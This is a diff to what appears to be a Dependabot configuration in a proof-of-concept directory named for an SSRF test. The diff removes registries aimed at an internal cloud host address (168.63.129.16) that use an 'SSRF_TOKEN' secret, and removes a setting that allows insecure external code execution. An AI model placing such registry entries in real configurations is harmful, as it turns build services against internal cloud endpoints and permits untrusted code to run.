@@ -1,20 +1,6 @@
 version: 2
-registries:
-  hgap-vmsettings:
-    type: python-index
-    url: http://168.63.129.16:32526/vmSettings#
-    token: ${{secrets.SSRF_TOKEN}}
-  hgap-versions:
-    type: python-index
-    url: http://168.63.129.16:32526/versions#
-    token: ${{secrets.SSRF_TOKEN}}
-
 updates:
   - package-ecosystem: "pip"
     directory: "/dependabot_poc/poc5_ssrf_hgap"
     schedule:
       interval: "daily"
-    insecure-external-code-execution: allow
-    registries:
-      - hgap-vmsettings
-      - hgap-versions
